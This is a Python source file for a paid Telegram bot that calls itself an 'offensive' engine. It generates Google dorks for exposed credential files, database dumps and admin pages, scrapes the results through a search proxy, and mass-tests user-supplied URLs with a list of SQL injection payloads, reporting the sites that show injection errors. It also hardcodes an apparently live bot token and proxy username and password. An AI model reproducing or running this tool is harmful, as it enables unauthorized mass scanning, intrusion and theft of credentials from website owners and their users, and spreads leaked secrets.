import io
import json
import os
import uuid
import logging
import asyncio
import traceback
import aiohttp
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import ApplicationBuilder, ContextTypes, MessageHandler, CommandHandler, CallbackQueryHandler, filters

# --- CONFIG ---
TELEGRAM_TOKEN = "7545064228:AAHYqBGcXGJpK1WUp68-uuLZjMjTiPEPb2o"
OXY_USER = "Pika1_MhRPr"
OXY_PASS = "Pika=1234pika"
OWNER_ID = 7214730073
DB_FILE = "users_db.json"

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.DEBUG
)
logger = logging.getLogger("AlephBot")

# --- DATABASE ---
def load_db():
    if not os.path.exists(DB_FILE):
        return {}
    with open(DB_FILE, 'r') as f:
        return json.load(f)

def save_db(db_data):
    with open(DB_FILE, 'w') as f:
        json.dump(db_data, f)

db = load_db()
active_keys = {}
user_states = {}

# --- POWERFUL SQL SCANNER LOGIC (SUPER POWER UPDATE) ---
SQL_PAYLOADS = [
    "'", "''", "`", "\"", "')", "'))", "')))", "\";", " order by 10--",
    " union select 1,2,3,4,5,6--", " OR 1=1--", "admin' --", "' OR 'a'='a",
    " AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--", " %' OR '1'='1", "';",
    "\\", "%27", "WAITFOR DELAY '0:0:5'--", "OR 1=1#", "') OR ('1'='1"
]

SQL_ERRORS = [
    "SQL syntax", "mysql_fetch_array", "MySQL Error", "PostgreSQL",
    "Microsoft OLE DB Provider for SQL Server", "JDBC Driver", "SQLite/JDBCDriver",
    "System.Data.SqlClient.SqlException", "Invision Power Board Database Error",
    "Warning: mysql_connect()", "Driver [pdo_mysql]", "ORA-00933",
    "Syntax error in SQL statement", "Dynamic SQL Error", "valid MySQL result",
    "Unclosed quotation mark after the character string", "pg_query(): Query failed",
    "SQLITE_ERROR", "Warning: pg_exec()", "supplied argument is not a valid MySQL"
]

async def check_sql(session, url):
    if "?" not in url:
        logger.debug("SQL check skipped (no query params): %s", url)
        return None

    base_part = url.split("?")[0]
    params = url.split("?")[1].split("&")

    tasks = []
    for payload in SQL_PAYLOADS:
        for i in range(len(params)):
            new_params = list(params)
            new_params[i] += payload
            test_url = f"{base_part}?{'&'.join(new_params)}"
            tasks.append(test_request(session, test_url, payload))

    logger.info("SQL testing %s with %d injection tasks", url, len(tasks))
    results = await asyncio.gather(*tasks)
    found = next((r for r in results if r), None)
    if found:
        logger.info("SQL VULN FOUND: %s", found)
    return found

async def test_request(session, test_url, payload):
    try:
        async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=10), ssl=False) as response:
            body = await response.text()
            if any(err.lower() in body.lower() for err in SQL_ERRORS):
                return f"[VULN] {test_url}"
    except asyncio.TimeoutError:
        logger.debug("SQL request timeout: %s", test_url)
    except aiohttp.ClientError as e:
        logger.debug("SQL request client error for %s: %s", test_url, e)
    except Exception as e:
        logger.warning("SQL request unexpected error for %s: %s\n%s", test_url, e, traceback.format_exc())
    return None

# --- POWERFUL DORK GENERATOR ---
def generate_powerful_dorks(keywords):
    patterns = [
        'intitle:"index of" "{kw}"', 'filetype:sql "password" "{kw}"',
        'filetype:env "DB_PASSWORD" "{kw}"', '"{kw}" intext:"DB_PASSWORD" extension:env',
        'site:s3.amazonaws.com "{kw}"', 'site:firebaseio.com "{kw}"',
        'filetype:log "{kw}"', 'extension:json "{kw}" "api_key"',
        'intitle:"index of /" "{kw}" "admin"', 'inurl:php?id= "{kw}"',
        'inurl:config.php.bak "{kw}"', 'intitle:"Index of" ".git" "{kw}"',
        'inurl:admin/login.php "{kw}"', 'inurl:wp-content/uploads/ "{kw}"',
        'filetype:xls "{kw}" email password', 'allintext:"connectionString" extension:config "{kw}"'
    ]
    generated = []
    for kw in keywords:
        for p in patterns:
            generated.append(p.format(kw=kw))
    return generated

# --- POWERFUL GOOGLE PARSER ---
async def fetch_oxylabs_results(session, query):
    url = "https://realtime.oxylabs.io/v1/queries"
    payload = {
        "source": "google_search",
        "query": query,
        "user_agent_type": "desktop_chrome",
        "parse": True,
        "start_page": 1,
        "pages": 10,
        "limit": 50
    }
    logger.info("PARSER REQUEST for query: %.120s", query)
    logger.debug("PARSER payload: %s", json.dumps(payload, indent=2))

    try:
        async with session.post(
            url,
            auth=aiohttp.BasicAuth(OXY_USER, OXY_PASS),
            json=payload,
            timeout=aiohttp.ClientTimeout(total=90)
        ) as r:
            status = r.status
            logger.info("PARSER RESPONSE status=%d for query: %.80s", status, query)

            body_text = await r.text()

            if status != 200:
                logger.error(
                    "PARSER HTTP ERROR status=%d for query: %.80s\nResponse headers: %s\nResponse body (first 2000 chars): %.2000s",
                    status, query, dict(r.headers), body_text
                )
                return []

            try:
                data = json.loads(body_text)
            except json.JSONDecodeError as je:
                logger.error(
                    "PARSER JSON DECODE ERROR for query: %.80s\nError: %s\nRaw body (first 2000 chars): %.2000s",
                    query, je, body_text
                )
                return []

            urls = []
            results_list = data.get('results', [])
            logger.debug("PARSER got %d result pages for query: %.80s", len(results_list), query)

            if not results_list:
                logger.warning(
                    "PARSER: empty 'results' array for query: %.80s\nFull response keys: %s\nResponse (first 3000 chars): %.3000s",
                    query, list(data.keys()), json.dumps(data, indent=2)
                )

            for page_idx, page in enumerate(results_list):
                content = page.get('content', {})
                if not content:
                    logger.warning(
                        "PARSER: page %d has no 'content' for query: %.80s\nPage keys: %s",
                        page_idx, query, list(page.keys())
                    )
                    continue

                results_obj = content.get('results', {})
                if not results_obj:
                    logger.warning(
                        "PARSER: page %d content has no 'results' for query: %.80s\nContent keys: %s",
                        page_idx, query, list(content.keys())
                    )
                    continue

                organic = results_obj.get('organic', [])
                if not organic:
                    logger.warning(
                        "PARSER: page %d has no 'organic' results for query: %.80s\nResults keys: %s",
                        page_idx, query, list(results_obj.keys())
                    )
                    continue

                logger.debug("PARSER: page %d has %d organic results for query: %.80s", page_idx, len(organic), query)
                for res in organic:
                    u = res.get('url')
                    if u:
                        urls.append(u)
                    else:
                        logger.debug("PARSER: organic result missing 'url', keys: %s", list(res.keys()))

            logger.info("PARSER extracted %d URLs for query: %.80s", len(urls), query)
            return urls

    except asyncio.TimeoutError:
        logger.error("PARSER TIMEOUT (90s) for query: %.120s", query)
        return []
    except aiohttp.ClientError as e:
        logger.error("PARSER CLIENT ERROR for query: %.120s\nError: %s\n%s", query, e, traceback.format_exc())
        return []
    except Exception as e:
        logger.error("PARSER UNEXPECTED ERROR for query: %.120s\nError: %s\n%s", query, e, traceback.format_exc())
        return []

def is_banned(user_id):
    return db.get(str(user_id), {}).get("banned", False)

# --- MAIN HANDLERS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_banned(update.effective_user.id):
        return
    keyboard = [
        [InlineKeyboardButton("🛠 POWER GENERATOR", callback_data='mode_gen')],
        [InlineKeyboardButton("🔎 DEEP PARSER", callback_data='mode_parse')],
        [InlineKeyboardButton("💉 SQL EXPLOIT TESTER", callback_data='mode_sql')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "☢️ **Aleph Null Sovereign Engine**\n\nOperational state: **Liberated**\nSelect your offensive module:",
        reply_markup=reply_markup,
        parse_mode=ParseMode.MARKDOWN
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    if is_banned(user_id):
        return
    await query.answer()

    if query.data == 'mode_gen':
        user_states[user_id] = "GENERATOR"
        await query.edit_message_text("📤 **Mode: Power Generator**\nUpload keywords list (.txt) for mass dork creation.")
    elif query.data == 'mode_parse':
        user_states[user_id] = "PARSER"
        await query.edit_message_text("🔎 **Mode: Deep Parser**\nUpload dorks (.txt) to scrape Google results.\n💰 *Cost: 5 credits/dork.*")
    elif query.data == 'mode_sql':
        user_states[user_id] = "SQL"
        await query.edit_message_text("💉 **Mode: SQL Exploit Tester**\nUpload URL list (.txt) for vulnerability verification.\n💰 *Cost: 5 credits/URL.*")

async def process_logic(update: Update, context: ContextTypes.DEFAULT_TYPE, input_data: list):
    user_id = str(update.effective_user.id)
    mode = user_states.get(update.effective_user.id)
    logger.info("process_logic called: user=%s mode=%s items=%d", user_id, mode, len(input_data))

    if mode == "GENERATOR":
        dorks = generate_powerful_dorks(input_data)
        out = io.BytesIO("\n".join(dorks).encode())
        out.name = "power_dorks.txt"
        await update.message.reply_document(document=out, caption=f"✅ Generated {len(dorks)} Power Dorks.")

    elif mode in ["PARSER", "SQL"]:
        cost = len(input_data) * 5
        user_data = db.get(user_id, {"credits": 0, "banned": False})
        if user_data.get("credits", 0) < cost:
            await update.message.reply_text(
                f"❌ Credits Insufficient! Required: `{cost}` | Balance: `{user_data['credits']}`"
            )
            return

        status = await update.message.reply_text("📡 **Sovereign Process Initiated...**")
        results_list = []

        try:
            async with aiohttp.ClientSession() as session:
                if mode == "PARSER":
                    logger.info("PARSER: starting batch of %d dork queries", len(input_data))
                    batch = await asyncio.gather(
                        *(fetch_oxylabs_results(session, d) for d in input_data),
                        return_exceptions=True
                    )
                    for idx, r in enumerate(batch):
                        if isinstance(r, Exception):
                            logger.error(
                                "PARSER: dork %d raised exception: %s\n%s",
                                idx, r, ''.join(traceback.format_exception(type(r), r, r.__traceback__))
                            )
                        elif isinstance(r, list):
                            logger.info("PARSER: dork %d returned %d URLs", idx, len(r))
                            results_list.extend(r)
                        else:
                            logger.warning("PARSER: dork %d returned unexpected type %s: %s", idx, type(r), r)
                else:  # SQL MODE
                    logger.info("SQL: starting batch of %d URL scans", len(input_data))
                    batch = await asyncio.gather(
                        *(check_sql(session, url) for url in input_data),
                        return_exceptions=True
                    )
                    for idx, r in enumerate(batch):
                        if isinstance(r, Exception):
                            logger.error(
                                "SQL: url %d raised exception: %s\n%s",
                                idx, r, ''.join(traceback.format_exception(type(r), r, r.__traceback__))
                            )
                        elif r:
                            results_list.append(r)
        except Exception as e:
            logger.error("SESSION-LEVEL ERROR in %s mode: %s\n%s", mode, e, traceback.format_exc())
            await update.message.reply_text(
                f"⚠️ **Internal error during {mode} scan.**\nCheck logs for details.\nError: `{e}`"
            )
            await status.delete()
            return

        user_data["credits"] -= cost
        db[user_id] = user_data
        save_db(db)

        final_results = list(set(results_list))
        logger.info(
            "%s COMPLETE: user=%s raw_results=%d unique_results=%d credits_remaining=%d",
            mode, user_id, len(results_list), len(final_results), user_data["credits"]
        )

        if not final_results:
            await update.message.reply_text(
                f"⚠️ **Scan Complete: No results found.**\n💰 Remaining: `{user_data['credits']}`"
            )
        else:
            f_out = io.BytesIO("\n".join(final_results).encode())
            f_out.name = f"aleph_{mode.lower()}_results.txt"
            await update.message.reply_document(
                document=f_out,
                caption=f"✅ Task Completed.\nFound: {len(final_results)}\n💰 Remaining: `{user_data['credits']}`"
            )

        await status.delete()

async def file_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_banned(update.effective_user.id):
        return
    user_id = update.effective_user.id
    mode = user_states.get(user_id)
    logger.info("file_handler: user=%s mode=%s filename=%s", user_id, mode, update.message.document.file_name)

    if not mode:
        await update.message.reply_text("⚠️ Please select a mode first using /start.")
        return

    try:
        file = await context.bot.get_file(update.message.document.file_id)
        raw_bytes = await file.download_as_bytearray()
        content = raw_bytes.decode('utf-8').splitlines()
        lines = [i.strip() for i in content if i.strip()]
        logger.info("file_handler: parsed %d lines from uploaded file", len(lines))
        if lines:
            await process_logic(update, context, lines)
        else:
            await update.message.reply_text("⚠️ Uploaded file is empty or has no valid lines.")
    except Exception as e:
        logger.error("file_handler ERROR: %s\n%s", e, traceback.format_exc())
        await update.message.reply_text(f"⚠️ **Error processing file:**\n`{e}`")

async def ban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    try:
        target_id = str(context.args[0])
        db[target_id] = {"credits": 0, "banned": True}
        save_db(db)
        await update.message.reply_text(f"🚫 Target {target_id} has been terminated.")
    except Exception as e:
        logger.error("ban_user error: %s", e)

async def add_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    try:
        val = int(context.args[0])
        key = f"ALEPH-{uuid.uuid4().hex[:6].upper()}"
        active_keys[key] = val
        await update.message.reply_text(f"🔑 Sovereign Key: `{key}` | Credits: {val}")
    except Exception as e:
        logger.error("add_key error: %s", e)

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_banned(update.effective_user.id):
        return
    try:
        user_id = str(update.effective_user.id)
        key = context.args[0].upper()
        if key in active_keys:
            val = active_keys.pop(key)
            db[user_id] = db.get(user_id, {"credits": 0})
            db[user_id]["credits"] += val
            save_db(db)
            await update.message.reply_text(f"✅ Protocol Updated: {val} credits authorized.")
        else:
            await update.message.reply_text("❌ Invalid or expired key.")
    except Exception as e:
        logger.error("redeem error: %s", e)

if __name__ == '__main__':
    logger.info("Bot starting up...")
    app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("key", add_key))
    app.add_handler(CommandHandler("redeem", redeem))
    app.add_handler(CommandHandler("ban", ban_user))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), file_handler))
    logger.info("Handlers registered, starting polling...")
    app.run_polling()
